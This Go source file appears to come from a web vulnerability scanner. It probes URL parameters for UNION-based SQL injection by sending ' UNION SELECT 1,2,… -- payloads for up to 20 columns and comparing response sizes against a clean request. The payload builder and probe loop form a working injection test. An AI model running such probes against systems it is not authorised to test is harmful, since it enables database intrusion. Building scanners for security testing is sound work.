package union_injection

import (
	"fmt"
	"github.com/SergeyAkaikin/vulnscan/internal/sqli"
	"io"
	"net/http"
	"regexp"
	"strings"
)

const maxColumns = 20

type Union struct {
	sqli.Base
}

var errorPayload = "(SELECT)|(select)|(statement)|(syntax)|(SYNTAX)|(Error)|(error)|(ERROR)"

func New(url string, method string, parameters ...string) *Union {
	return &Union{
		sqli.Base{
			Url:         url,
			Method:      method,
			QParameters: parameters,
		},
	}
}

func (u *Union) Inject(extCookies *http.Cookie) (injectable bool, payload string) {
	clearRes, _, err := u.MakeRequest(0, "", extCookies)
	if err != nil {
		return false, ""
	}
	clearSize := clearRes.ContentLength
	if clearSize == -1 {
		content, err := io.ReadAll(clearRes.Body)
		if err != nil {
			return false, ""
		}

		clearSize = int64(len(content))
	}

	for i := 0; i < maxColumns; i++ {
		res, payload, err := u.MakeRequest(0, columnsString(i), extCookies)
		if err != nil {
			continue
		}

		resSize := res.ContentLength
		if resSize == -1 {
			content, err := io.ReadAll(res.Body)
			if err != nil {
				continue
			}

			reg := regexp.MustCompile(errorPayload)
			if reg.Match(content) {
				continue
			}

			resSize = int64(len(content))
		}

		fmt.Println(clearSize, resSize)

		if resSize != clearSize {
			return true, payload
		}
	}

	return false, ""

}

func columnsString(count int) string {
	b := strings.Builder{}
	b.WriteString("' UNION SELECT 1")
	for i := 2; i <= count; i++ {
		b.WriteString(fmt.Sprintf(",%d", i))
	}

	b.WriteString(" -- // ")
	return b.String()
}
